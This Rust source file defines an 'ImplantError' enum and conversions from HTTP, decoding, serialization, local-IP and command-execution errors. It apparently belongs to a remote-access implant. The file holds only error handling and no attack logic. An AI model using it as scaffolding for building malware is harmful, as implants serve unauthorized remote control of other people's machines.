use std::ffi::OsString;

use thiserror::Error;

#[derive(Error, Debug)]
pub enum ImplantError {
    #[error("Response error")]
    ResponseError,
    #[error("Base64 decode error")]
    DecodeError,
    #[error("Arrayvec conversion error")]
    ArrayvecError,
    #[error("Bincode decode error")]
    BincodeError,
    #[error("Local ip resolver error")]
    LocalIpError,
    #[error("Os String conversion error")]
    OsStringError,
    #[error("Error while executing command")]
    CommandError,
}

impl std::convert::From<reqwest::Error> for ImplantError {
    fn from(_err: reqwest::Error) -> Self {
        ImplantError::ResponseError
    }
}

impl std::convert::From<base64::DecodeError> for ImplantError {
    fn from(_err: base64::DecodeError) -> Self {
        ImplantError::DecodeError
    }
}

impl std::convert::From<arrayvec::ArrayVec<u8, 32_usize>> for ImplantError {
    fn from(_err: arrayvec::ArrayVec<u8, 32_usize>) -> Self {
        ImplantError::ArrayvecError
    }
}

impl std::convert::From<arrayvec::ArrayVec<u8, 24_usize>> for ImplantError {
    fn from(_err: arrayvec::ArrayVec<u8, 24_usize>) -> Self {
        ImplantError::ArrayvecError
    }
}

impl std::convert::From<arrayvec::ArrayVec<u8, 16_usize>> for ImplantError {
    fn from(_err: arrayvec::ArrayVec<u8, 16_usize>) -> Self {
        ImplantError::ArrayvecError
    }
}

impl std::convert::From<Box<bincode::ErrorKind>> for ImplantError {
    fn from(_err: Box<bincode::ErrorKind>) -> Self {
        ImplantError::BincodeError
    }
}

impl std::convert::From<local_ip_address::Error> for ImplantError {
    fn from(_err: local_ip_address::Error) -> Self {
        ImplantError::LocalIpError
    }
}

impl std::convert::From<OsString> for ImplantError {
    fn from(_err: OsString) -> Self {
        ImplantError::OsStringError
    }
}

impl std::convert::From<std::io::Error> for ImplantError {
    fn from(_err: std::io::Error) -> Self {
        ImplantError::CommandError
    }
}
